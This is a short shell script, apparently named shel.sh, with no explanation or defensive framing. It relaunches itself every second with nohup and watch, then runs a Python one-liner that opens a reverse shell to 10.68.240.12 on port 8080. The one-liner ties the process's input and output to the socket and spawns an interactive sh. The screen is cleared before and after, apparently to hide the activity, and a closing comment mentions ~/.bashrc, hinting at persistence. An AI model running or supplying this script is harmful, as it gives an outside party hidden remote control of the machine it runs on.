#!/bin/sh
#rm shel.sh
clear
nohup watch -n 1 sh ./shel.sh &
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.68.240.12",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
clear

#~/.bashrc test
